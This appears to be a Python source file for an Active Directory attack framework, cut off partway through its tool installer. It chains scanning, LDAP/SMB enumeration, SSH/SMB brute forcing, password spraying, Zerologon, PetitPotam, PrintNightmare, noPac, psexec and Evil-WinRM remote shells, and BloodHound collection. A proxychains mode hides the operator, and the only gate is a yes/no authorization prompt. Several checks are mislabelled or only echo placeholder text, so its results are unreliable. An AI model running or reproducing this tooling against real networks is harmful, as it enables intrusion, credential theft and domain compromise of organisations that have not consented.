#!/usr/bin/env python3
"""
AD-Framework - Active Directory Penetration Testing Framework
Author: Jaber Hasan
Version: 1.0
"""

import os
import sys
import subprocess
import time
import json
import re
from pathlib import Path
import getpass
import shutil
import socket

class ADPenTestFramework:
    def __init__(self):
        self.tools_dir = Path.home() / "AD-Framework-Tools"
        self.scan_dir = Path.home() / "AD-PenTest-Results"
        self.install_log = self.tools_dir / "installed_tools.log"
        self.setup_directories()
        self.scan_results = {}
        self.is_root = os.geteuid() == 0
        self.anonymous = False
        
    def setup_directories(self):
        """Create necessary directories"""
        self.tools_dir.mkdir(exist_ok=True)
        self.scan_dir.mkdir(exist_ok=True)
        
    def clear_screen(self):
        """Clear terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
        
    def print_banner(self):
        """Display framework banner"""
        banner = """
   ___    ____        _____            _____     _____    _____    _____ 
  / _ \  |  _ \      |  ___|   ___    |  ___|   /  _  \  |  ___|  /  _  \\
 / /_\ \ | | | |____ | |__    / _ \\   | |__    | | | |  | |__    | | | |
/ _____ \\| | | |____||  __|  | | | |  |  __|   | | | |  |  __|   | | | |
/ /   \ \| |_/ /     | |___  | |_| |  | |___   | |_| |  | |___   | |_| |
\/     \/|____/      |_____|  \___/   |_____|   \_____/  |_____|  \_____/
                                                                        
Active Directory Penetration Testing Framework v1.0
Author: Jaber Hasan
        """
        print(banner)
        
    def sanitize_filename(self, name):
        """Sanitize filename by replacing invalid characters"""
        return re.sub(r'[<>:"/\\|?*]', '_', name)
        
    def validate_domain(self, domain):
        """Validate domain format"""
        domain_regex = r'^[a-zA-Z0-9-]+\.[a-zA-Z]{2,}$'
        return bool(re.match(domain_regex, domain))
        
    def run_command(self, cmd, tool_name="", silent=False, use_sudo=True, verbose=True):
        """Execute system command with error handling"""
        if self.anonymous and shutil.which('proxychains4'):
            cmd = f"proxychains4 {cmd}"
        if use_sudo and not self.is_root:
            cmd = f"sudo {cmd}"
        try:
            print(f"[*] Executing: {cmd}")
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                if not silent:
                    print(f"[✓] {tool_name} completed successfully")
                    if verbose and result.stdout:
                        print("[*] Output:")
                        print(result.stdout)
                return True, result.stdout
            else:
                if not silent:
                    print(f"[✗] {tool_name} failed: {result.stderr}")
                return False, result.stderr
        except Exception as e:
            if not silent:
                print(f"[✗] Error running {tool_name}: {str(e)}")
            return False, str(e)
    
    def save_output(self, phase, content, filename, format="txt"):
        """Save output to file in specified format if content is valid"""
        if not content or "command not found" in content or "failed" in content.lower():
            print(f"[!] Skipping saving {filename} due to invalid or empty output")
            return None
        safe_filename = self.sanitize_filename(filename)
        output_file = self.scan_dir / f"{phase}_{safe_filename}.{format}"
        try:
            output_file.parent.mkdir(parents=True, exist_ok=True)
            if format == "json":
                with open(output_file, 'w') as f:
                    json.dump(json.loads(content) if content and content.strip() else {}, f, indent=2)
            else:
                with open(output_file, 'w') as f:
                    f.write(content)
            print(f"[+] Saved output to {output_file}")
            return output_file
        except Exception as e:
            print(f"[!] Error saving output to {output_file}: {e}")
            return None

    def get_user_inputs(self):
        """Get all necessary inputs from user"""
        print("\n[+] Penetration Testing Configuration")
        print("="*50)
        
        while True:
            self.target_domain = input("Enter target domain (e.g., company.com): ").strip()
            if self.validate_domain(self.target_domain):
                break
            print("[!] Invalid domain format. Please enter a valid domain (e.g., company.com).")
            retry = input("Try again? (y/N): ").lower().strip()
            if retry != 'y':
                self.target_domain = "example.com"
                print("[!] No valid domain provided, using default: example.com")
                break
        
        self.target_ip = input("Enter target IP or IP range (e.g., 192.168.1.0/24): ").strip()
        if not self.target_ip:
            self.target_ip = "127.0.0.1"
            print("[!] No IP provided, using default: 127.0.0.1")
            
        self.dc_ip = input("Enter Domain Controller IP (if known, else press Enter): ").strip()
        if not self.dc_ip:
            self.dc_ip = self.target_ip
            print(f"[!] No DC IP provided, using target IP: {self.dc_ip}")
            
        print("\n[+] Credentials (leave empty if unknown)")
        self.username = input("Username: ").strip()
        if not self.username:
            self.username = input("No username provided. Enter now or press Enter to skip credentialed tools: ").strip()
            
        self.password = getpass.getpass("Password: ") if self.username else ""
        if self.username and not self.password:
            self.password = getpass.getpass("No password provided. Enter now: ")
        
        wordlist_path = input("Wordlist path [default: /usr/share/wordlists/rockyou.txt]: ").strip()
        self.wordlist = wordlist_path if wordlist_path and os.path.exists(wordlist_path) else "/usr/share/wordlists/rockyou.txt"
        if not os.path.exists(self.wordlist):
            print("[!] Wordlist not found. Password attacks will be skipped.")
            self.wordlist = None
        
        self.anonymous = input("Enable anonymous mode with proxychains4? (y/N): ").lower().strip() == 'y'
        if self.anonymous and not shutil.which('proxychains4'):
            print("[!] Proxychains4 not installed. Anonymous mode disabled.")
            self.anonymous = False
        
        print("\n[+] Scan Intensity")
        aggressive = input("Use Aggressive mode (fast, comprehensive)? (Y/N): ").lower().strip() == 'y'
        self.scan_type = "aggressive" if aggressive else "stealth"
        print(f"[+] Scan mode set to: {self.scan_type}")
        
        print(f"\n[+] Configuration Complete")
        print(f"Target: {self.target_domain} | IP Range: {self.target_ip} | DC: {self.dc_ip} | Anonymous: {'Yes' if self.anonymous else 'No'}")
        input("\nPress Enter to start penetration testing...")

    def phase1_network_discovery(self):
        """Phase 1: Network Discovery and Scanning"""
        print("\n" + "="*60)
        print("PHASE 1: NETWORK DISCOVERY AND SCANNING")
        print("="*60)
        
        open_ports = ["21", "22", "23", "25", "53", "80", "88", "110", "135", "139", "143", "389", 
                      "443", "445", "464", "593", "636", "993", "995", "1433", "3389", "5985", "5986"]
        
        # Masscan
        print("\n[*] Configuring Masscan...")
        if not shutil.which('masscan'):
            print("[!] Masscan not installed. Skipping Masscan.")
        else:
            ports = input(f"Enter ports to scan (e.g., 1-65535, or press Enter for defaults {','.join(open_ports)}): ").strip()
            if not ports:
                ports = ','.join(open_ports)
            rate = input("Enter scan rate (default 1000): ").strip() or "1000"
            masscan_cmd = f"masscan -p{ports} {self.target_ip} --rate={rate} -oG {self.scan_dir}/masscan_results.txt"
            if not self.is_root:
                print("[!] Masscan requires root privileges. Using default ports without scanning.")
            else:
                success, output = self.run_command(masscan_cmd, "Masscan", use_sudo=True)
                if success:
                    self.scan_results['masscan'] = output
                    self.save_output("phase1", output, "masscan")
                    parsed_ports = self.parse_masscan_results()
                    if parsed_ports:
                        open_ports = parsed_ports
                        print(f"[+] Found {len(open_ports)} open ports: {', '.join(open_ports)}")

        # Nmap
        print("\n[*] Configuring Nmap...")
        nmap_ports = input(f"Enter ports for Nmap (e.g., 80,443,445, or press Enter for {','.join(open_ports)}): ").strip() or ','.join(open_ports)
        nmap_args = input("Enter additional Nmap arguments (e.g., -sV -sC, or press Enter for defaults): ").strip()
        if self.scan_type == "aggressive":
            base_cmd = f"nmap -A -T4 -p{nmap_ports} --script=ldap*,smb*,krb5* -vv"
        else:
            base_cmd = f"nmap -sS -T2 -p{nmap_ports} --script=ldap*,smb*,krb5* -vv"
        nmap_cmd = f"{base_cmd} {nmap_args} {self.target_ip} -oA {self.scan_dir}/nmap_scan"
        success, output = self.run_command(nmap_cmd, "Nmap", use_sudo=True)
        if success:
            self.scan_results['nmap'] = output
            self.save_output("phase1", output, "nmap_scan", format="xml")

        # GoWitness
        if shutil.which('gowitness'):
            print("\n[*] Configuring GoWitness...")
            threads = input("Enter number of threads for GoWitness (default 10): ").strip() or "10"
            gowitness_cmd = f"gowitness scan cidr -t {threads} --log-scan-errors -c {self.target_ip} --write-db --write-db-uri sqlite://{self.scan_dir}/gowitness.sqlite3"
            success, output = self.run_command(gowitness_cmd, "GoWitness", use_sudo=True)
            if success:
                self.scan_results['gowitness'] = output
                self.save_output("phase1", output, "gowitness")
        else:
            print("[!] GoWitness not installed. Skipping.")

    def parse_masscan_results(self):
        """Parse masscan results to extract open ports"""
        masscan_file = self.scan_dir / "masscan_results.txt"
        open_ports = set()
        
        if not masscan_file.exists():
            print("[!] Masscan output file not found.")
            return []
            
        try:
            with open(masscan_file, 'r') as f:
                for line in f:
                    if "Ports:" in line and "open" in line:
                        parts = line.split()
                        for part in parts:
                            if "/" in part and part.endswith("/tcp"):
                                port = part.split("/")[0]
                                open_ports.add(port)
        except Exception as e:
            print(f"[!] Error parsing masscan: {e}")
            return []
            
        return list(open_ports)

    def phase2_ad_enumeration(self):
        """Phase 2: Active Directory Enumeration"""
        print("\n" + "="*60)
        print("PHASE 2: ACTIVE DIRECTORY ENUMERATION")
        print("="*60)
        
        if self.target_domain == "example.com":
            print("[!] Invalid or default domain. DNS and LDAP enumeration may fail.")
        
        # DNS Enumeration
        print("\n[*] Configuring DNS Enumeration...")
        record_type = input("Enter DNS record type (e.g., SRV, A, or press Enter for SRV): ").strip() or "SRV"
        dns_cmd = f"nslookup -type={record_type} _ldap._tcp.{self.target_domain}"
        success, output = self.run_command(dns_cmd, "DNS Enumeration", use_sudo=True)
        if success:
            self.scan_results['dns_enumeration'] = output
            self.save_output("phase2", output, "dns_enumeration")

        # LDAP Search
        print("\n[*] Configuring LDAP Search...")
        base_dn = input(f"Enter base DN (e.g., dc={self.target_domain.replace('.', ',dc=')}, or press Enter for default): ").strip() or f"dc={self.target_domain.replace('.', ',dc=')}"
        ldap_cmd = f"ldapsearch -x -LLL -H ldap://{self.dc_ip} -b \"{base_dn}\""
        if not self.username or not self.password:
            print("[*] No credentials provided. Attempting anonymous LDAP bind...")
            ldap_cmd = f"ldapsearch -x -LLL -H ldap://{self.dc_ip} -b \"{base_dn}\" -D '' -w ''"
        success, output = self.run_command(ldap_cmd, "LDAP Search", use_sudo=True)
        if success:
            self.scan_results['ldap_search'] = output
            self.save_output("phase2", output, "ldap_search")
        else:
            print("[!] LDAP anonymous bind may not be supported. Provide credentials to proceed.")

        # SMB Shares
        print("\n[*] Configuring SMB Shares...")
        smb_cmd = f"smbclient -L //{self.target_ip} -N"
        success, output = self.run_command(smb_cmd, "SMB Shares", use_sudo=True)
        if success:
            self.scan_results['smb_shares'] = output
            self.save_output("phase2", output, "smb_shares")

        # ldapdomaindump
        if self.username and self.password and shutil.which('ldapdomaindump'):
            print("\n[*] Configuring ldapdomaindump...")
            ldd_cmd = f"ldapdomaindump -u '{self.target_domain}\\{self.username}' -p '{self.password}' -d {self.scan_dir} ldap://{self.dc_ip} --verbose"
            success, output = self.run_command(ldd_cmd, "ldapdomaindump", use_sudo=True)
            if success:
                self.scan_results['ldapdomaindump'] = output
                self.save_output("phase2", output, "ldapdomaindump", format="json")

        # windapsearch
        windapsearch_path = self.tools_dir / 'windapsearch' / 'windapsearch.py'
        if self.username and self.password and windapsearch_path.exists():
            print("\n[*] Configuring windapsearch...")
            module = input("Enter windapsearch module (e.g., users, groups, or press Enter for users): ").strip() or "users"
            ws_cmd = f"python3 {windapsearch_path} --dc-ip {self.dc_ip} -u {self.target_domain}\\{self.username} -p {self.password} --module {module} --verbose"
            success, output = self.run_command(ws_cmd, "windapsearch", use_sudo=True)
            if success:
                self.scan_results['windapsearch'] = output
                self.save_output("phase2", output, f"windapsearch_{module}")

        # AdFind
        adfind_path = self.tools_dir / 'AdFind' / 'AdFind.exe'
        if adfind_path.exists():
            print("\n[*] Configuring AdFind...")
            filter = input("Enter AdFind filter (e.g., objectcategory=user, or press Enter for default): ").strip() or "objectcategory=user"
            adf_cmd = f"wine {adfind_path} -f {filter} -h {self.dc_ip}"
            success, output = self.run_command(adf_cmd, "AdFind", use_sudo=True)
            if success:
                self.scan_results['adfind'] = output
                self.save_output("phase2", output, "adfind")

    def phase3_vulnerability_assessment(self):
        """Phase 3: Vulnerability Assessment"""
        print("\n" + "="*60)
        print("PHASE 3: VULNERABILITY ASSESSMENT")
        print("="*60)
        
        vuln_checks = [
            ("SMB Signing Check", f"nmap --script smb-security-mode -p445 {self.target_ip}"),
            ("Kerberos Checks", f"nmap --script krb5-enum-users -p88 {self.target_ip}"),
            ("LLMNR NBT-NS Poisoning Check", "echo 'Check for LLMNR/NBT-NS in network'"),
            ("SMB Null Session", f"rpcclient -U '' -N {self.target_ip}")
        ]
        
        for check_name, command in vuln_checks:
            print(f"\n[*] Configuring {check_name}...")
            additional_args = input(f"Enter additional arguments for {check_name} (or press Enter for none): ").strip()
            cmd = f"{command} {additional_args}" if additional_args else command
            success, output = self.run_command(cmd, check_name, use_sudo=True)
            if success:
                self.scan_results[check_name] = output
                self.save_output("phase3", output, check_name.replace(' ', '_'), format="xml" if "nmap" in command.lower() else "txt")

        # PingCastle
        pingcastle_path = self.tools_dir / 'PingCastle' / 'PingCastle.exe'
        if pingcastle_path.exists():
            print("\n[*] Configuring PingCastle...")
            if not shutil.which('wine32'):
                print("[!] wine32 missing. Install with: sudo dpkg --add-architecture i386 && sudo apt update && sudo apt install wine32:i386")
            else:
                additional_args = input("Enter additional PingCastle arguments (or press Enter for none): ").strip()
                pc_cmd = f"wine {pingcastle_path} --server {self.dc_ip} --verbose {additional_args}"
                success, output = self.run_command(pc_cmd, "PingCastle", use_sudo=True)
                if success:
                    self.scan_results['pingcastle'] = output
                    self.save_output("phase3", output, "pingcastle")

        # SMBGhost
        print("\n[*] Configuring SMBGhost Check...")
        smbghost_cmd = f"nmap --script smb-protocols -p445 {self.target_ip}"
        success, output = self.run_command(smbghost_cmd, "SMBGhost Check", use_sudo=True)
        if success:
            self.scan_results['smbghost'] = output
            self.save_output("phase3", output, "smbghost", format="xml")

        # EternalBlue
        print("\n[*] Configuring EternalBlue Check...")
        eb_cmd = f"nmap -p445 --script smb-vuln-ms17-010 {self.target_ip}"
        success, output = self.run_command(eb_cmd, "EternalBlue Check", use_sudo=True)
        if success:
            self.scan_results['eternalblue'] = output
            self.save_output("phase3", output, "eternalblue", format="xml")

        # BlueKeep
        print("\n[*] Configuring BlueKeep Check...")
        bk_cmd = f"nmap -p3389 --script rdp-vuln-ms12-020 {self.target_ip}"
        success, output = self.run_command(bk_cmd, "BlueKeep Check", use_sudo=True)
        if success:
            self.scan_results['bluekeep'] = output
            self.save_output("phase3", output, "bluekeep", format="xml")

        # Credentials Roaming
        print("\n[*] Configuring Credentials Roaming Check...")
        cr_cmd = f"nmap --script smb-enum-users -p445 {self.target_ip}"
        success, output = self.run_command(cr_cmd, "Credentials Roaming Check", use_sudo=True)
        if success:
            self.scan_results['credentials_roaming'] = output
            self.save_output("phase3", output, "credentials_roaming", format="xml")

        # Bronze Bit
        print("\n[*] Configuring Bronze Bit Check...")
        bb_cmd = f"nmap --script krb5-enum-users -p88 {self.target_ip}"
        success, output = self.run_command(bb_cmd, "Bronze Bit Check", use_sudo=True)
        if success:
            self.scan_results['bronze_bit'] = output
            self.save_output("phase3", output, "bronze_bit", format="xml")

        # Zerologon
        print("\n[*] Configuring Zerologon Check...")
        zl_cmd = f"nmap --script smb-vuln-cve2020-1472 -p445 {self.target_ip}"
        success, output = self.run_command(zl_cmd, "Zerologon Check", use_sudo=True)
        if success:
            self.scan_results['zerologon_check'] = output
            self.save_output("phase3", output, "zerologon_check", format="xml")

        # PetitPotam
        print("\n[*] Configuring PetitPotam Check...")
        pp_cmd = "echo 'PetitPotam requires specific checks; use manual tool'"
        success, output = self.run_command(pp_cmd, "PetitPotam Check", use_sudo=True)
        self.scan_results['petitpotam_check'] = output
        self.save_output("phase3", output, "petitpotam_check")

        # PrintNightmare
        print("\n[*] Configuring PrintNightmare Check...")
        pn_cmd = f"nmap --script smb-vuln-cve-2021-1675 -p445 {self.target_ip}"
        success, output = self.run_command(pn_cmd, "PrintNightmare Check", use_sudo=True)
        if success:
            self.scan_results['printnightmare'] = output
            self.save_output("phase3", output, "printnightmare", format="xml")

        # GoldenPac
        print("\n[*] Configuring GoldenPac Check...")
        gp_cmd = "echo 'GoldenPac requires Kerberos ticket analysis'"
        success, output = self.run_command(gp_cmd, "GoldenPac Check", use_sudo=True)
        self.scan_results['goldenpac_check'] = output
        self.save_output("phase3", output, "goldenpac_check")

        # SamAccountName Spoofing
        print("\n[*] Configuring SamAccountName Spoofing Check...")
        ss_cmd = "echo 'noPac vulnerability check requires specific setup'"
        success, output = self.run_command(ss_cmd, "SamAccountName Spoofing Check", use_sudo=True)
        self.scan_results['samaccountname_spoofing'] = output
        self.save_output("phase3", output, "samaccountname_spoofing")

    def phase4_password_attacks(self):
        """Phase 4: Password Attacks"""
        print("\n" + "="*60)
        print("PHASE 4: PASSWORD ATTACKS")
        print("="*60)
        
        if not self.username or not self.wordlist or not os.path.exists(self.wordlist):
            print("[!] Skipping password attacks - missing credentials or wordlist")
            return
        
        self.password = getpass.getpass("Enter password for attacks: ") if not self.password else self.password
        if not self.password:
            print("[!] No password provided. Skipping password attacks.")
            return
            
        # Hydra SSH
        if shutil.which('hydra'):
            print("\n[*] Configuring Hydra SSH...")
            hydra_ssh_cmd = f"hydra -l {self.username} -P {self.wordlist} ssh://{self.target_ip} -vv"
            success, output = self.run_command(hydra_ssh_cmd, "Hydra SSH", use_sudo=True)
            if success:
                self.scan_results['hydra_ssh'] = output
                self.save_output("phase4", output, "hydra_ssh")

        # Hydra SMB
        if shutil.which('hydra'):
            print("\n[*] Configuring Hydra SMB...")
            hydra_smb_cmd = f"hydra -l {self.username} -P {self.wordlist} smb://{self.target_ip} -vv"
            success, output = self.run_command(hydra_smb_cmd, "Hydra SMB", use_sudo=True)
            if success:
                self.scan_results['hydra_smb'] = output
                self.save_output("phase4", output, "hydra_smb")

        # Kerbrute
        kerbrute_path = self.tools_dir / 'kerbrute'
        if kerbrute_path.exists():
            print("\n[*] Configuring Kerbrute...")
            users_file = input("Enter path to users file for Kerbrute (or press Enter to skip): ").strip()
            if users_file and os.path.exists(users_file):
                kerbrute_cmd = f"{kerbrute_path} passwordspray -d {self.target_domain} --users {users_file} {self.password} --verbose"
                success, output = self.run_command(kerbrute_cmd, "Kerbrute", use_sudo=True)
                if success:
                    self.scan_results['kerbrute'] = output
                    self.save_output("phase4", output, "kerbrute")
            else:
                print("[!] Skipping Kerbrute - no valid users file")

        # Hashcat
        if shutil.which('hashcat') and os.path.exists("hashes.txt"):
            print("\n[*] Configuring Hashcat...")
            hash_type = input("Enter Hashcat hash type (e.g., 1000 for NTLM, or press Enter for default): ").strip() or "1000"
            hashcat_cmd = f"hashcat -m {hash_type} hashes.txt {self.wordlist} -O --verbose"
            success, output = self.run_command(hashcat_cmd, "Hashcat", use_sudo=True)
            if success:
                self.scan_results['hashcat'] = output
                self.save_output("phase4", output, "hashcat")

        # Responder
        responder_path = self.tools_dir / 'Responder' / 'Responder.py'
        if responder_path.exists():
            print("\n[*] Configuring Responder...")
            interface = input("Enter network interface for Responder (e.g., eth0, or press Enter for default): ").strip() or "eth0"
            resp_cmd = f"python3 {responder_path} -I {interface} -rdwv --verbose"
            print(f"[*] Responder command: {resp_cmd}")
            print("[!] Responder runs in background. Simulating for safety.")
            self.scan_results['responder'] = "Responder simulated"
            self.save_output("phase4", "Responder simulated", "responder")

    def phase5_exploitation(self):
        """Phase 5: Exploitation"""
        print("\n" + "="*60)
        print("PHASE 5: EXPLOITATION")
        print("="*60)
        
        if not self.username or not self.password:
            print("[!] Skipping credentialed exploits - no credentials")
            exploits = []
        else:
            print("\n[*] Configuring Impacket psexec...")
            psexec_cmd = f"python3 {self.tools_dir}/Impacket/examples/psexec.py {self.target_domain}/{self.username}:{self.password}@{self.target_ip}"
            exploits = [("Impacket psexec", psexec_cmd)]
        
        exploits += [
            ("Mimikatz (simulated)", "echo 'Mimikatz would be used here for credential dumping'"),
            ("Golden Ticket Attack", "echo 'Golden ticket attack simulation'")
        ]
        
        for exploit_name, command in exploits:
            print(f"\n[*] Running {exploit_name}...")
            success, output = self.run_command(command, exploit_name, use_sudo=True)
            if success:
                self.scan_results[exploit_name] = output
                self.save_output("phase5", output, exploit_name.replace(' ', '_'))

        # Zerologon
        zerologon_path = self.tools_dir / 'CVE-2020-1472' / 'zerologon_tester.py'
        if zerologon_path.exists():
            print("\n[*] Configuring Zerologon...")
            dc_name = input("Enter DC name for Zerologon (e.g., DC01, or press Enter to skip): ").strip()
            if dc_name:
                zl_cmd = f"python3 {zerologon_path} {dc_name} {self.dc_ip} --verbose"
                success, output = self.run_command(zl_cmd, "Zerologon", use_sudo=True)
                if success:
                    self.scan_results['zerologon'] = output
                    self.save_output("phase5", output, "zerologon")
            else:
                print("[!] Skipping Zerologon - DC name required")

        # PetitPotam
        petitpotam_path = self.tools_dir / 'PetitPotam' / 'PetitPotam.py'
        if petitpotam_path.exists():
            print("\n[*] Configuring PetitPotam...")
            listener = input("Enter listener IP for PetitPotam: ").strip()
            target = input("Enter target server for PetitPotam: ").strip()
            if listener and target:
                pp_cmd = f"python3 {petitpotam_path} {listener} {target} --verbose"
                success, output = self.run_command(pp_cmd, "PetitPotam", use_sudo=True)
                if success:
                    self.scan_results['petitpotam'] = output
                    self.save_output("phase5", output, "petitpotam")
            else:
                print("[!] Skipping PetitPotam - listener and target required")

        # PrintNightmare
        if self.username and self.password:
            printnightmare_path = self.tools_dir / 'CVE-2021-1675' / 'PrintNightmare.py'
            if printnightmare_path.exists():
                print("\n[*] Configuring PrintNightmare...")
                pn_cmd = f"python3 {printnightmare_path} {self.target_domain}/{self.username}:{self.password}@{self.target_ip} --verbose"
                success, output = self.run_command(pn_cmd, "PrintNightmare", use_sudo=True)
                if success:
                    self.scan_results['printnightmare'] = output
                    self.save_output("phase5", output, "printnightmare")

        # CrackMapExec
        if self.username and self.password and shutil.which('cme'):
            print("\n[*] Configuring CrackMapExec...")
            cme_args = input("Enter CrackMapExec arguments (e.g., --shares, or press Enter for default): ").strip() or "--shares"
            cme_cmd = f"cme smb {self.target_ip} -u {self.username} -p {self.password} {cme_args} --verbose"
            success, output = self.run_command(cme_cmd, "CrackMapExec", use_sudo=True)
            if success:
                self.scan_results['cme_smb'] = output
                self.save_output("phase5", output, "cme_smb")

        # Evil-WinRM
        if self.username and self.password and shutil.which('evil-winrm'):
            print("\n[*] Configuring Evil-WinRM...")
            ew_cmd = f"evil-winrm -i {self.target_ip} -u {self.username} -p {self.password} --verbose"
            success, output = self.run_command(ew_cmd, "Evil-WinRM", use_sudo=True)
            if success:
                self.scan_results['evil_winrm'] = output
                self.save_output("phase5", output, "evil_winrm")

        # Rubeus Golden
        print("\n[*] Configuring Rubeus Golden...")
        rub_cmd = f"echo 'Rubeus golden /aes256:HASH /user:admin /domain:{self.target_domain}'"
        success, output = self.run_command(rub_cmd, "Rubeus Golden", use_sudo=True)
        self.scan_results['rubeus_golden'] = output
        self.save_output("phase5", output, "rubeus_golden")

        # GoldenPac
        if self.username and self.password:
            goldenpac_path = self.tools_dir / 'Impacket' / 'examples' / 'goldenPac.py'
            if goldenpac_path.exists():
                print("\n[*] Configuring GoldenPac...")
                gp_cmd = f"python3 {goldenpac_path} {self.target_domain}/{self.username}:{self.password}@{self.dc_ip} --verbose"
                success, output = self.run_command(gp_cmd, "GoldenPac", use_sudo=True)
                if success:
                    self.scan_results['goldenpac'] = output
                    self.save_output("phase5", output, "goldenpac")

        # noPac
        if self.username and self.password:
            nopac_path = self.tools_dir / 'noPac' / 'noPac.py'
            if nopac_path.exists():
                print("\n[*] Configuring noPac...")
                netbios_name = input("Enter domain NetBIOS name for noPac (e.g., CORP, or press Enter to skip): ").strip()
                if netbios_name:
                    np_cmd = f"python3 {nopac_path} -domain-netbios {netbios_name} -user {self.username} -pass {self.password} -dc {self.dc_ip} --verbose"
                    success, output = self.run_command(np_cmd, "noPac", use_sudo=True)
                    if success:
                        self.scan_results['nopac'] = output
                        self.save_output("phase5", output, "nopac")
                else:
                    print("[!] Skipping noPac - NetBIOS name required")

    def phase6_post_exploitation(self):
        """Phase 6: Post-Exploitation"""
        print("\n" + "="*60)
        print("PHASE 6: POST-EXPLOITATION")
        print("="*60)
        
        # BloodHound
        print("\n[*] Configuring BloodHound...")
        if self.username and self.password:
            collection_method = input("Enter BloodHound collection method (e.g., All, Default, or press Enter to skip): ").strip() or "Default"
            if collection_method:
                bh_cmd = f"bloodhound-python -d {self.target_domain} -u {self.username} -p {self.password} -ns {self.dc_ip} -c {collection_method} --zip --verbose"
                success, output = self.run_command(bh_cmd, "BloodHound Data Collection", use_sudo=True)
                if success:
                    self.scan_results['bloodhound'] = output
                    self.save_output("phase6", output, "bloodhound", format="zip")
            else:
                print("[!] Skipping BloodHound - no collection method provided")
        else:
            print("[!] Skipping BloodHound - credentials required")
            self.scan_results['bloodhound'] = "BloodHound skipped - no credentials"
            self.save_output("phase6", "BloodHound skipped - no credentials", "bloodhound")

        # Privilege Escalation
        linpeas_path = self.tools_dir / 'linpeas.sh'
        print("\n[*] Configuring Privilege Escalation Check...")
        if linpeas_path.exists():
            linpeas_cmd = f"{linpeas_path}"
            success, output = self.run_command(linpeas_cmd, "Privilege Escalation Check", use_sudo=True)
            if success:
                self.scan_results['privilege_escalation'] = output
                self.save_output("phase6", output, "privilege_escalation")
        else:
            print("[!] linpeas not available")
            self.scan_results['privilege_escalation'] = "linpeas not available"
            self.save_output("phase6", "linpeas not available", "privilege_escalation")

        # Lateral Movement
        print("\n[*] Configuring Lateral Movement Check...")
        lm_cmd = "echo 'Checking for lateral movement opportunities'"
        success, output = self.run_command(lm_cmd, "Lateral Movement Check", use_sudo=True)
        self.scan_results['lateral_movement'] = output
        self.save_output("phase6", output, "lateral_movement")

        # PlumHound
        if self.username and self.password:
            plumhound_path = self.tools_dir / 'PlumHound' / 'PlumHound.py'
            if plumhound_path.exists():
                print("\n[*] Configuring PlumHound...")
                ph_cmd = f"python3 {plumhound_path} --easy -u {self.username} -p {self.password} -d {self.target_domain} -s {self.dc_ip} --verbose"
                success, output = self.run_command(ph_cmd, "PlumHound", use_sudo=True)
                if success:
                    self.scan_results['plumhound'] = output
                    self.save_output("phase6", output, "plumhound")

        # PowerView
        powerview_path = self.tools_dir / 'PowerView.ps1'
        if powerview_path.exists():
            print("\n[*] Configuring PowerView...")
            pv_cmd = f"powershell -ep bypass -file {powerview_path} -Command 'Get-DomainUser'"
            success, output = self.run_command(pv_cmd, "PowerView", use_sudo=True)
            if success:
                self.scan_results['powerview'] = output
                self.save_output("phase6", output, "powerview")

    def generate_report(self):
        """Generate comprehensive penetration testing report"""
        print("\n" + "="*60)
        print("GENERATING FINAL REPORT")
        print("="*60)
        
        report_file = self.scan_dir / "penetration_test_report.txt"
        
        with open(report_file, 'w') as f:
            f.write("AD PENETRATION TESTING REPORT\n")
            f.write("="*50 + "\n\n")
            f.write(f"Target Domain: {self.target_domain}\n")
            f.write(f"Target IP Range: {self.target_ip}\n")
            f.write(f"Domain Controller IP: {self.dc_ip}\n")
            f.write(f"Scan Type: {self.scan_type}\n")
            f.write(f"Anonymous Mode: {'Yes' if self.anonymous else 'No'}\n")
            f.write(f"Date: {time.ctime()}\n\n")
            
            f.write("SUMMARY OF FINDINGS:\n")
            f.write("-" * 30 + "\n")
            
            for phase, results in self.scan_results.items():
                f.write(f"\n{phase.upper()}:\n")
                f.write(f"Completed: {'YES' if results else 'NO'}\n")
                if results:
                    f.write(f"Output preview: {results[:200]}...\n")
                
        print(f"[+] Report generated: {report_file}")
        print(f"[+] All results saved in: {self.scan_dir}")
        
        # Zip the scan_dir
        zip_file = str(self.scan_dir.parent / f"pentest_results_{int(time.time())}.zip")
        shutil.make_archive(zip_file.replace('.zip', ''), 'zip', str(self.scan_dir))
        print(f"[+] Results zipped to: {zip_file}")

        # Remove individual files, keep only zip and report
        for item in self.scan_dir.iterdir():
            if item.name != "penetration_test_report.txt":
                if item.is_dir():
                    shutil.rmtree(item)
                else:
                    item.unlink()
        print("[+] Removed individual files, keeping only zip and report.")

    def start_penetration_testing(self):
        """Main penetration testing workflow"""
        self.clear_screen()
        self.print_banner()
        
        print("\n[!] WARNING: This tool is for authorized penetration testing only!")
        print("[!] Ensure you have proper authorization before proceeding!\n")
        
        confirm = input("Do you have authorization to test this target? (y/N): ").lower().strip()
        if confirm != 'y':
            print("[!] Testing cancelled. Only use with proper authorization.")
            input("Press Enter to continue...")
            return
            
        self.get_user_inputs()
        
        phases = [
            self.phase1_network_discovery,
            self.phase2_ad_enumeration,
            self.phase3_vulnerability_assessment,
            self.phase4_password_attacks,
            self.phase5_exploitation,
            self.phase6_post_exploitation
        ]
        
        for phase in phases:
            try:
                phase()
                time.sleep(2)
            except Exception as e:
                print(f"[!] Error in phase: {str(e)}")
                continue
                
        self.generate_report()
        
        print("\n[+] Penetration testing completed!")
        print(f"[+] Results saved in: {self.scan_dir}")
        input("\nPress Enter to return to main menu...")

    def install_tools(self):
        """Check and install required tools"""
        required_binaries = {
            'masscan': 'sudo apt install masscan -y',
            'nmap': 'sudo apt install nmap -y',
            'ldapsearch': 'sudo apt install ldap-utils -y',
            'smbclient': 'sudo apt install smbclient -y',
            'rpcclient': 'sudo apt install smbclient -y',
            'hydra': 'sudo apt install hydra -y',
            'proxychains': 'sudo apt install proxychains -y',
            'hashcat': 'sudo apt install hashcat -y',
            'go': 'sudo apt install golang-go -y',
            'ruby': 'sudo apt install ruby-full -y',
            'wine': 'sudo apt install wine -y && sudo dpkg --add-architecture i386 && sudo apt update && sudo apt install wine32:i386 -y',
        }

        required_git = {
            'impacket': {
                'url': 'https://github.com/fortra/impacket.git',
                'path': self.tools_dir / 'Impacket',
                'install': 'pip3 install .'
            },
            'PlumHound': {
                'url': 'https://github.com/PlumHound/PlumHound.git',
                'path': self.tools_dir / 'PlumHound',
                'install': 'pip3 install -r requirements.txt'
            },
            'Responder': {
                'url': 'https://github.com/lgandx/Responder.git',
                'path': self.tools_dir / 'Responder',
            },
            'windapsearch': {
                'url': 'https://github.com/ropnop/windapsearch.git',
                'path': self.tools_dir / 'windapsearch',
                'install': 'sudo apt install libldap2-dev libsasl2-dev && pip3 install python-ldap'
            },
